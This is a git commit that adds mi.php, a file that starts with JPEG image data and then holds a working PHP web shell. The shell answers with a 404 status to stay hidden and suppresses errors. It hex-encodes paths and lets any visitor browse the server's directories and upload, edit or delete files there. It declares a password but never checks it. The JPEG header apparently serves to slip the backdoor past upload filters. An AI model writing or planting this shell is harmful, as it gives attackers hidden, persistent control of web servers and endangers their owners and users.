d4bb77121f2a35eab500ab4f0522eec32e33292a
chaeltheex3c <129634613+chaeltheex3c@users.noreply.github.com>
2025-07-31 01:53:05 +0700

    Add files via upload

---
+++ mi.php
@@ -0,0 +1,303 @@
+����JFIF�����������
+#"#!-$!!*&:%*.1444#:?:3>-3433*#+333413>311411333333333<333331333133313333>33;33333�����6"���������������������B�
+���!1AQ"aq2������BR�br�#3C�����S�5s��������������������#���������!1A2Q"a������?��1I�,�Ԇg}!�7P�0&�!-���eR��.�A{x\C\:I2�B��.^�oX�vt�n&��) Qz��	�H.�I�����R'�L%R����F��
+�fu&Z��`�,��.axEq�a��X���!	+"X%�sl�":Ik���)b�T��^)��
+d����G�T�J	J�2��,�b*Ϸ�''�LJʛ8%��{�ay
+
+�W%*���I���(��?�� :</
+JT���-�t=�|W�˜ʔYL�E�iS��_V��Hg�Z
+A5P /}�n,`+���P5���1�Ǭ9�����8&:a�Zeǈ�t���C�K���3
+R�q��p�0�&b��A����<<�	�	�V�����K�Xu����3��	Nmzf߼3/����7#Q�ĔЄ��yCx|C����؇��5>`�gI�̜Y�̛����<�V�v=Z{=��q�:�
+���G�pt��.T�O��V��,��/��Mh;�lo�y���3h��Q�Eĕ0�(�r۶Ŷ�h�X���ƪ����X�)��'M/��`�c�/�[�nݣ��\�>��,0�夌���9z��s���z�~T�g�@��:�K�I�I$��Zr���$�kx코�9&�+PX4,ڀm�ǔr���s��) �B�OD�d�Bv���HM�R�J��44x����o{��%J��hbbYI���h'�ʠ�a\9�R�Q�H!@�Tu�~ʿ�(�2�Hb�
+h�Vp���ys
+�RCk�UU�xZ���[4��(ж��ʪ�oR��L:]�4k�{���.��ѹcJN�����r�;6Y�1,R"��%��A�sH�.%���4n�3T����K�A�ḵɘ�) <�g�S�ı�:,gD�`,�B;¸�;�?�v{�@
+Fl�$�.\���g9�UHf�D섐��i�Y�u���!��D;��Z��	��2K�>i��;()UC��v�Hï8P��9J��Fd��˗W���0�P_� ��BhRs#���0б���v=��|��ܓ�wBR*KX=X�g,2�{ófef�����8R(��HgV�J�~$� 8;��Jd������@Q��T�� m��N��������*�fp�ga@Y�\��bx|��S��H��l�Hr9���
+L�,�h̟�jv�dB	�h9MK����O���RH�C������$�6��K���1�5���Ϝ�$�e u�r�KW5	�7<x��oh�nV��,�$���N�)DɆ�2��$�a�mc���o�N.a:��B�����X{?=i�Q1�$/�����T�S7��i�I�Y��u͹�k�u%�N����a\���� �S������k]�sZEv/�8��Sb��;s*�H7�-R�Z��*�;�XrR��b��8u!��4)HU�&��6�<�bY]]��.ްsN�ج)3VSC�WB@ooV�[�i�I��%SP�v�)K�<?(߲Ғf#2Hn�H�@$���u�O�L�!2b�(�e�f6R@Q�$9��W�]���bU�ֻ�s8IL��))HrQV�vr+j�X�"�����t�z�u��qt���)�˔)N���JR�:\�5c�Ff"Ze�����
+(���^�$��/G�^�\}N�V�#1�kh�Y�eg��ͯH�F`̓ʰK���F��0H�1�Z��`kF\Ԗ�F�4�	q�Mrt"0�E>0z��(d�X]2͹G]z*$�\x�Hh���h�K�bw�&p����@�=lЬ�&��!�ቨ0%JQp;�
+�KV���ż�*yr��W��W!�h
+Ŧ���#�{Ơ�a&�P�D��V��HmT�xy����c����bҐ���MX�S׸�%`%�8IrHpI"��n 9���RH�)�R���%
+�.�v󋉸�̐H���=�W+
+��ZS�a��C8!\�Ro��KBE{g��^b�� c�5m���w5����^�C�h��[+0cH�d���
+�b�^8����^�45���J|�>��Z�R%�/0;h��X�����\�G0j��E�����qG�W�g���+��\�fpA�~�#9�� T\Ћ��ِ2��E��b1.2���~�>��MA�u���
+-�A�,.[ZS�50�5Hљ�t*�T�**�}�ܶ��d�,���f,�r ���_H����<�]J����:�ޑ�`=����X%�����C��k�{�<��-m�ڈ�G����8u -Ԃ����%-}_�ڞN>d��T�Au�)
+H�+sl��ǩ����K���C�b�H;4Q㿢�VN(n��Ӟ�zme�q�q&,�4���%���@��@�� �q��`��TR�!�R�s�YN�}{�\�e12e��1@�P�.\�Va�^��c�r��"R�.��A�]�7�tRu�4���HNj�Ki@u�b���N^SA��T
+@n�SW{R9�"((*o̐X�:n
+��Ԓ�e�C(ѫ[h�Dm?N֎ǅ(���4�I�VW�����½��q����Z�,��*4K:كf`Y��1�Z��&��T���L(-��_��d�KA���
+mG�qd�Vu�\�>�עR���Y�^Q���T���z'W��c�
+��B�T��!*	�1 ��E�
+��_iW����R�d�S�X�.�(�zC���1
+�0]kd�
+D�)@Ⳗ"��8����[O�d�ⴛDr���y�/�!K^E�
+�&��мs����G�qN�U�d�Q���ܤ���aW"�⥨�
+B�YiUH���t��nm]k��Z��Ͷ���	pl{E�X=@��P���3��W�%.VZ��H�ܰ�DBM��Ґ���nr�A�;�Ѐ�:�6d{�� �XƦb��6�d���C�������U���53�.�_tH����X�d��Rr�%LA7:Wh����>fa��6���\D䉁���AG!�7�'��ʴ���aF����T��T�,�G�m ��Ȩ,��xBT�h�P�]����f��	��`��*,��Y���!���FbT���픤�i�7�&��i�*zf��P	� 3:Mw������2�E@`�g���7�B@a�.���=a��*]�{=mB5���
+��ԎW��@1:iNP�l�MkZ� ��(l�(8SZ6�-����������zt} ,� �9��¢���4UJ�B��)��G=th�p)Y-�+�hC�@k\�������c��R�S@�w�m!yx"R�5bA���d&cs�35(����@��,��P	�T�Է�v��%4*ck��	s2;K~��b����&�������F(��i7�u���m�Y3��E�s�I�v�at��7��IJ�H�I�X
+i|G�ġ�a��5�.�xY)�� �).X�����q�ȘA�e$'�����/6b�����Q(���o��ˋ{^���b��=��UV��3)Gs���o����9��S��DPa]5Tu�2p��&Z?q z��r{};[[���1������R�� � �4 (;�����x	2e�'(`�	��!���qU
+~1�7�f�۪h�N?�̞+;ݎC)+�h�	�
+�@��&�P�����Ĥ�iir6[|ϬY[3Z���}ڝ�o+
+��"+�@�g��h]�I����)���'�ެ�]�b[�@i	ڝ?H�e�LL�K8ޑ��U�8�(�*�%X�
+�_���|U�
+�o�X]��6c�N�� \��FC9�����@yj%��	pA���"H�yd��]yC�w���)A���.a,�S����WYP�$
+
+^��49+���f ��h�A[��LL�a��A|.Z�_�vӤO���ք��XŻ%7�b3&(�b��F~gaP���N�v��e*䱱�#=� ��F�>��mX�@!�Wm�^YMͲ��$*�&��n�8z���p��r�×4�{�y��P7��_�R���<�V�,[G������LN�0A�}�{���O����]�>!��3�*fE1B�T*�J��&�/���3�<�éA%IMC'�Mc��bS0��$!G1 ����8��o$�B��Ō�B_:��$L,Hk0ؒC�����������3;KU��t�
+�/�
+�JR��&�M
+I!��KO@��'���Q5�X�R�«������{#�Yr���j��0|+	���R����R�G�
+:j@rDSb8�,�8n���V<�2�*�
+����:M�p�<o߃�pj��X?�'�1>�K�r���I:�jn�eG=��?=�?!���!g���;->!	��]���L3V��Ůt�x߄$����9�8������JJ�5
+MS���@�J�@�qK��GiI��o~�$��Ld��Im���R�f's���!�:�6��ӜX5F�~0c*cUL�@!Åv�#���$�S�v���k�@���
+j�{C̣d��	Eb���@A��
+�j�+�%�Qv��H-X��jt�����W���K�,;���):F�Iţ .p�	pCT������W}��օ���۷���yM��d&fG
+[�H]X0O�C[ӫ~��8щ�3���V��R)���9C����}+�����HJM٪�G�H�',0�����a�X�	�=4���s��A��M5�x��Ei���(�h�c�~�ܽ��o]��q$a��Rґ��\���HٮސJ2ܐ��77��x��O-�"F`�[_O��fk�֗}� ����HVj�����R�S@jr��{B� (��$�E>�Y���� �AH����F�9S�:�I<JYt��A�����X�JR	JC���n�m�0����� ��(]��P/Ճ�(��q���R�VP�S�Q5ݮ�(j�y��.`-���\�8�n4б�2�O���l	bZ�C�ؗ�+H�r�ך��
+52Zf2zV��?��e�ݠ��{|�J�[p��|����Zf�8g�\����Ј4�ī��+u3��~�OY,2>���A�إ��j}y����3��P1�Dr���rM���8�U����3�:~�M����T�.
+G��
+�w��m-D���(�G�'Q�M�q�Z��H&��H! N�"�G09Xw00�=b�
+.%H��U�{|%'7�@$à��
+&Lȝ���Lԡ,�Iʚj_/َ�J$$�Et5�(0x\�0�Ie�Lų'��$n��tw���g-R<..�K��r|�1�H����N�v����o�)z3�-�����Qw���WS�3V��o�jޑZ�W�P'M�O�L,���
+7pys
+�����RE��<���Gd�ٞ�S�LG2�v�;^��x�Dـ�EI%��l���ϿX}S*mR�AO/:�V�ޕ��5�QS&d�2,z��9��@�ٵ��RFW�f:3�iA	P2�TIz�w���	p��@q��Tf����0���SB���p�	.�fK'A}��FC�K�Հ}7�F@Y"bTHa�����w��A�3��5ލ�-CƲ���#�ѭ�e宎_^��u�
+\�V��	�) �i�@�b/���{�f)`ln��Ag�PL��D;=z
+ +���9Ԧ!-���ϩ�!LbfT����nk�E�����@�*T2�榦���4�y��HwbI/ջ�����e���	c�,Z����%�y�@�G�����Π�iv:�D� %A2�eř�e�3@NZT��Mk��K��͗!j�C(�Y�_��)bϖ�h��	�zr}>��Z��I6��[k�JTR���a֎-ME۴bV9�8�`Mv%�թ�4�Y� (*���}`�%E�����-�GK��l�J��
+T��ŉ!.	sJU�ա��&$�Kj�*`.mo_8��x�
+1)JC�$�����@U��"bTe�edh�
+�bA .F�Ǘ�ՙt?_�=�S.B��@Vfp�j�E��s�h�oo�^U��y�~�qm8қ�����YZ��Np�K��'1���e��:Md}��O
+Z��Lk�Q��K��R�I؟M>
+J�G��2¿0���~���b�t�LL"�I����d��h���Q�Q�z��8��g�<�	�Yaͨ���K	X�7�w�#��Rkr+]Z��"�U(N�*N+A̅����Z��K-*��ܧX�JCU�qKރ�r|{��lS)T`sz�Qzg�b���
+Mu�FL�&�ߴ����	�_Sn�<���c�
+�%�.E�f�3��CR[+(3���{�T�<�5�]_��� ؟/�r�䗣kڢ�*`C�@
+Kk��_HL��J�f�`�u��"I�f��|L��#*�w�V��b	���(���-G�?H	'�1��;�<b�I��!eN�A7�},�ڽ`��e���f��('M�.��c��
+�-@h:�S�WNU&��W��w�J�Lr�JH'Mގ:7�uK4d8�
+�?Z��da�
+Z�P��j��
+����0-*InQ`�JT��M"S�Iʯ*��Աb�zF~�3*rL�@�5_8�����^��S����p�	9���M�Gx�y��TTJ�4���R�(�+��'KFP�X�����}\��x���J�
+RSG����D	�
+XC�Pf��՜t�����ːE=_�3��͔���S���Y�G�;��;3:ɔ�[�Q%ˀ��N�@��)Q3+PB�B	n�7�F��R��)6IX�Q5�wz��'�)$��E��[Z0.l��MnZ�=l	K�z6�FR/_H�-`�)Tt��Q��,S$Ā��w�1k� 5���}�	H���A> hI�g��P���������:b�\�tgջ�?#8�)�@��M��W�Rr��R�m�KפQ�$7:�0ֵ��<R&��(9,�pH%�m@cSQ5F����cjU�%��d��·,�,
+�w�������B̴�h))^SW�-,ݨH.]ずM��#��͒�S
+y�X�����^��x��IPb�'Ɛ�Ԭ%M����w��N�h��o�͔�ۿ��E�vR�Ѧ�
+/^�5���_�^��<r^iy�)��0���f�Y3�5*B��#~��ۘԹ^'p�lD��	⇼@FkZ����,���N�o�	p�l�P�[�;/2�IuWj�����f�Ʉ%6w����B$���R�:�Z�A.j%���4j�E+���x��\�KC�s�A������M��n���T���Ua��9{(��ٔd�9w��%ә.4,�\<Qp,dKD�*�tb�E�j��@��ZL�$r*��s��3�9��McPe*bX����/VU�'%i��ڊ�/K�Qx�g��=�C��b�M
+A"��3���A��q%����<C+����o^�Y6L��a�\���&�9��%Θ�)K	&��$���
+؂ͬ��*�N\�0QvKn�״�e�b��[A_�[En(��b�����^�T��,�4��1��v04M�QC�~U������o�b��XqvaJ��~1�I����s�J#�(��)938�BRw�����^�ֵ) �[-	�ih�LBE��X1�OاH"e���i.(K���Z�5a�S�9�'��Z&�֛DV��%�\[W�]�H�+
+ �ܸI�C�Gh�,�`6Q�5(kؐ�# �4s�\��\�Aqj8���Ô��R���e%D�e�����6��`�d�Tv��&�=��KT��n[7AVؐ�H�ᖕ(��%�+�����@;��Ԁ9K^�g�]�]��*tf��M5��DL��M/��䱾�?�0KP	�$��T(X�a����oD��Ti֬X�g�� P,>�9�v%�Zքq+\��� T��EP8�o�xH{��QYJ�*.�buj���qHQ�R�S[9�1Bq��=ӫ� x�Y)���o��0�I!AB�*!�$T��l	�;Q%4�94-n�
+������ɫ�t�����g���*�A�8"��Ԟa���K\��@ ���T9��G���# *�wA��z�����Y�z�Fм٥�bZ���h�>Pbx�@%5K܋3;�5"�Ʀ�D9��
+���(�K�*>�B8�Nn+��ր�G�Ϙ��kpj���C�����nk���b�j\�$��ta������JU[)`tak1�`9�.41e�����T�Н�ݵ�L����]��Ŕ���f0���[X��D�	Vmѧh��G�Ŧ�i��xS5�WqI<�w�@���0>�V��O�,A�ڈRl��y�A�х�}��V][n��$eJCD���ɝ�e�]R�K4).LɁԬ�D���˘�(�jZE�:���RR��(ȩ�UX�qj^�JJf�%�1�@�˜�(�*	��7�8'��@IȹkAŔ�z�ӯh���
+QJ])	f���5�x�-�B�u���c�(x��	ZK�).�w���&�
+y�@dQT�T2֢��J ��d(
+Ѷ���.I��D��R@%u�ȢKXյr�B՜��gb�ހ3��Mt��1@ʕ	��Y�j�o,�!s���3e �����L�%�NX��J^�Qw�ҩ�����
+d�%D�HE���G`5?�	�2��IbA`h	H{�o����2��j�#��[h^yd%԰�>e]T����8?�~d��A��K��P]D��>���K�
+���X�y�E3d̦0�
+֝;F��H��S��@ll^��s��!�#(��=�'ɻF������=z�,L\D��plApAb5�I�z���]`�E��_����P�r�w ek�CsXVf,�v��0b���P����'�AJK6R�]+Ҏ��k�"XO ]Ff��ణ= +1R�j���d���&�􌆱R�H`M�O:�b��
+���%.J���K$�H�vYd�f*3[.Zy�б'��h$�
+���y�p.��N�h���L���)�@,��:p�B�Hc�R��r�N����D%*Vf.�Z3QM�6�bqG\�4`¿�A�*yR�c�P
+$0r)���g�1�<�M����=Z��h���Qbϡϩ�i�Vʙ��(Nl��Y������8;e�:
+�t���i��Ρ�С�B���Hs�j�6���[e�KوfqjW0�76�&�P�	`�s96j������!C��B��[���'"�'ԓB�귅�+b�e$+*h�@���:����V��R�=�>7B�>���fk���0�	�<!�iGb�,�Py�K�#+����BhhA����)�r+������=Z��B����i���]�H�NWb/qچ����
+pz9%�h+�A�P�x2��Q%��CҢ�H�p	�!�5_r+MX��I���P)w%��AZ
+�@�>Phcf����H�2(
+\��(����à���EK3V�?n�B$!�K�I;����zF)�iW��(+��lp��R�
+��,���o��KPIp�hk�z��<��N�)�@�;����d�
+q
+u��j�:'��qQ���H%$�7�,�Ӧ�kGa��:�7��O�'Z�+H�r��
+d�<��Fk_?���yw��H����w�[)��-�=�F�w�x
+U����u(nP�{ԏ􈯺w��R'�3�E�@R��
+ 2r7BB�{XW�{,�
+bT3>U�
+ה��j� jı�K�RهX��8N��,S+��H�P�
+|���m������M�[��֚�XlC�gR�$�B\�:��o@�f��{͕���*�s[�3?�@$�eAIC�=���F�9X�V!.V���ɟ��+�I�o���	g�6��e!!YT�|M[e!Y��R:���8P�O=
+*ً��H�zr�R
+����K�W)��[Z�	J��\ʨ���6�qq{�1��Kffv ������;(b��@:�G�?��jB\����]��R�j�����vV�E@ �Q���C��0�)AM@	���n]��x�Wr
+�Ff�C�l�*zj��js3��f�X�mBj����Rse.�P-f�u����!AH�T�\�!��������KAP|�.y�$����m����'���:B�W1n`K���/��p��Ԣ���.3)�� �JE�g��JT�C�p�瘵?	o
+DEsR� ��qZ6��zK%IZ�*.���P��H^rT����/fҷ5?y+J�R�k��5�.��aJK���	
+�H
+���z���-O@�PU�=�w��-H,�Q59����E�������Go���3�����7���c�(�\�AZFF@*�k��kG�cG��c# ��v��c����A��7��.��7��R.�A󌌀�	�΄�Nm"�)$%�LKPS�FF@+3Į��H�Y��Ί?S���<R�+�_�Y��22��/�G��DFF@r��|��A��?�Y���>Q��v�^�����/��!���9q��-�+��������.�lB�X`�
+nH���IB �W�FFA"��,s��_�>��g�R��c# J�D�����W?���F� '*���>RU�2Aj����z�F@W#��ܘvZ����������
+�G�U4$����o���8��1�����<?php
+http_response_code(404);
+error_reporting(0);
+set_time_limit(0);
+session_start();
+ini_set("memory_limit", "-1");
+$password = "babiah";
+$sessioncode = md5(__FILE__);
+
+function get_file_permissions($file) {
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+
+function is_writable_permission($file) {
+    return is_writable($file);
+}
+
+function edit_file($file, $content) {
+    if (file_put_contents($file, $content) !== false) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function delete_file($file) {
+    if (unlink($file)) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function hex2bin_recursive($str) {
+    return preg_replace_callback('/[0-9a-f]{2}/i', function($matches) {
+        return chr(hexdec($matches[0]));
+    }, $str);
+}
+
+$dir = isset($_GET['dir']) ? hex2bin_recursive($_GET['dir']) : '.';
+$files = scandir($dir);
+$upload_message = '';
+$edit_message = '';
+$delete_message = '';
+$current_dir = realpath($dir);
+
+if (isset($_FILES['file_upload'])) {
+    $target_dir = $dir . '/';
+    $target_file = $target_dir . basename($_FILES['file_upload']['name']);
+    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
+        $upload_message = 'File berhasil diunggah.';
+    } else {
+        $upload_message = 'Gagal mengunggah file.';
+    }
+}
+
+if (isset($_POST['edit_file'])) {
+    $file = $_POST['edit_file'];
+    $content = file_get_contents($file);
+    if ($content !== false) {
+        echo '<form method="post" action="">';
+        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
+        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
+        echo '<input type="submit" name="submit_edit" value="Submit">';
+        echo '</form>';
+        echo 'Note: this private method xD if file after edit blank or error dm me lol';
+    } else {
+        $edit_message = 'Gagal membaca isi file.';
+    }
+}
+
+if (isset($_POST['submit_edit'])) {
+    $file = $_POST['edited_file'];
+    $content = $_POST['file_content'];
+    if (edit_file($file, base64_decode($content))) {
+        $edit_message = 'File berhasil diedit.';
+    } else {
+        $edit_message = 'Gagal mengedit file.';
+    }
+}
+
+if (isset($_POST['delete_file'])) {
+    $file = $_POST['delete_file'];
+    if (delete_file($file)) {
+        $delete_message = 'File berhasil dihapus.';
+    } else {
+        $delete_message = 'Gagal menghapus file.';
+    }
+}
+
+if (isset($_GET['navigate'])) {
+    $target_dir = $_GET['navigate'];
+    if (is_dir($target_dir)) {
+        $dir = $target_dir;
+        $files = scandir($dir);
+    } else {
+        echo '<p>Directory not found.</p>';
+    }
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        form {
+            margin-bottom: 10px;
+        }
+        textarea {
+            width: 100%;
+            height: 300px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        table, th, td {
+            border: 1px solid #ccc;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+        .directory-link {
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h2>h0d3_g4nt3ng</h2>
+    <form method="post" enctype="multipart/form-data">
+        <label>Upload file:</label>
+        <input type="file" name="file_upload">
+        <input type="submit" value="Upload">
+        <input type="hidden" name="dir" value="<?php echo bin2hex($dir); ?>">
+    </form>
+    <?php if (!empty($upload_message)): ?>
+    <p><?php echo $upload_message; ?></p>
+    <?php endif; ?>
+    <?php if (!empty($edit_message)): ?>
+    <p><?php echo $edit_message; ?></p>
+    <?php endif; ?>
+    <?php if (!empty($delete_message)): ?>
+    <p><?php echo $delete_message; ?></p>
+    <?php endif; ?>
+    <table>
+        <tr>
+            <th>Filename</th>
+            <th>Permissions</th>
+            <th>Actions</th>
+        </tr>
+        <?php foreach ($files as $file): ?>
+        <tr>
+            <td>
+                <?php if (is_dir($dir . '/' . $file)): ?>
+                <a class="directory-link" href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"><?php echo $file; ?></a>
+                <?php else: ?>
+                <?php echo $file; ?>
+                <?php endif; ?>
+            </td>
+            <td><?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : ''; ?></td>
+            <td>
+                <?php if (is_file($dir . '/' . $file)): ?>
+                <form action="" method="post" style="display: inline-block;">
+                    <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
+                    <button type="submit">Edit</button>
+                </form>
+                <form action="" method="post" style="display: inline-block;">
+                    <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
+                    <button type="submit">Delete</button>
+                </form>
+                <?php endif; ?>
+            </td>
+        </tr>
+        <?php endforeach; ?>
+    </table>
+</body>
+</html>
